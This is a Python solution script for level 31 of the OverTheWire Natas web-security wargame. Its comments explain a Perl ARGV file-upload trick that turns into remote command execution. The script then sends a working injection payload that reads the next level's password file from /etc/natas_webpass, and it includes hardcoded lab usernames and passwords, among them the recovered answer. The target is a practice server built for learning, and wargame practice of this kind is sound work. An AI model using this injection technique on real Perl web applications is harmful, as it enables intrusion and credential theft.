#!/usr/bin/env python

import requests
from bs4 import BeautifulSoup
from urllib.parse import quote

username = "natas31"
password = "hay7aecuungiuKaezuathuk9biin0pu1"

url = "http://%s.natas.labs.overthewire.org/" % username
session = requests.Session()

# In the context of the script if filename = ARGV the following line while (<$file>)
#  will loop through the argument passed to the script inserting each one to an open()
# call, it means remote code execution !
# To execute code, instead of sending POST /index.pl, we will send POST /index.pl?|<command>|.
# We need to append a | at the end to make sure the argument is interpreted as a command.
# We also, need to add the following block to the header of the Submit query :
"""
-----------------------------13233996644575656779668363
Content-Disposition: form-data; name="file";
Content-Type: text/plain

ARGV
"""

injection = "cat /etc/natas_webpass/natas32 | xargs echo|"
injection_url_encoded = quote(injection, safe="")
new_url = url + "?" + injection_url_encoded

# note: there should a 'sample.csv' in the same directory as this script
post_date = {"file": "ARGV"}

post_file = {"file": open("sample.csv", "rb")}

req = requests.Request(
    "POST", new_url, auth=(username, password), data=post_date, files=post_file
)
prep = req.prepare()

response = session.send(prep)
content = response.content

soup = BeautifulSoup(content, "html.parser").prettify()
print(soup)

print()  # just for having some space

# this time we got an /index-source.html
# the documentation is above :)
#
# we got it right:
# Username: natas32
# Password: no1vohsheCaiv3ieH4em1ahchisainge

